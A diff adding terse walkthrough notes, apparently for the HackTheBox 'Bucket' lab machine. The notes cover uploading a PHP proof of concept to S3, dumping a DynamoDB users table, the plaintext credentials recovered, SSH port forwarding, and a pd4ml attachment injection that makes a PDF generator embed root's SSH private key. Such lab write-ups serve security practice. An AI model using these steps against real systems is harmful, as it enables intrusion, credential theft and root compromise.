@@ -1,0 +1,64 @@
+Upload files:
+
+aws s3 cp poc.php s3://adserver/poc.php --endpoint-url http://s3.bucket.htb
+
+Dynamodb query:
+
+aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
+aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
+
+Get tables:
+
+dynamodb.listTables({Limit: 10}, function(err, data) {
+  if (err) {
+    console.log("Error", err.code);
+  } else {
+    console.log("Table names are ", data.TableNames);
+  }
+});
+
+Get schema:
+
+
+dynamodb.describeTable({TableName: 'users'}, function(err, data) {
+  if (err) {
+    console.log("Error", err.code);
+  } else {
+    console.log("Table: ", data.Table.KeySchema);
+  }
+});
+
+Dump:
+
+  var params = {
+    TableName: 'users',
+    Select: "ALL_ATTRIBUTES",
+  };
+
+dynamodb.scan(params, function(err, data) {
+  if (err) {
+    console.log("Error", err.code);
+  } else {
+    console.log("Table: ", JSON.stringify(data, null, 0));
+  }
+});
+
+Data found:
+
+Mgmt:Management@#1@#
+Cloudadm:Welcome123!
+Sysadm:n2vM-<_K_Q:.Aa2
+
+roy:n2vM-<_K_Q:.Aa2
+
+ss -lntu to discover open ports locally
+
+then we see that we need to port forward with ssh -L 4566:127.0.0.1:4566 roy@bucket.htb
+
+create table to generate the pdf from the data inserted and in the pdf embed a local file (ssh creds for root)
+
+we need to create the table because it doesn't exist (see restore.php at the end)
+
+curl -ik 127.0.0.1:8000/ -d "action=get_alerts" && ll files && strings files/result.pdf
+
+aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://127.0.0.1:4566 && aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment src=\"file:/root/.ssh/id_rsa\" description=\"attachment sample\"/>"}}' --endpoint-url http://127.0.0.1:4566
